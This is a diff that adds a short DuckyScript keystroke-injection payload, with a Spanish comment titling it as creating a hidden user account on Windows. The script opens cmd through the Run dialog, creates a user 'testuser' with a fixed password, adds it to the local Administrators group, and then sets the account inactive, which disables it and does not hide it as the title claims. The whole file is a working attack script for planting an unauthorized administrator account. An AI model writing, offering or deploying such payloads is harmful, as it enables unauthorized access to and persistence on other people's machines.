@@ -1,0 +1,18 @@
+REM Crear una Cuenta de Usuario Oculta
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING net user testuser testpass /add
+ENTER
+DELAY 500
+STRING net localgroup Administrators testuser /add
+ENTER
+DELAY 500
+STRING net user testuser /active:no
+ENTER
+DELAY 500
+STRING exit
+ENTER
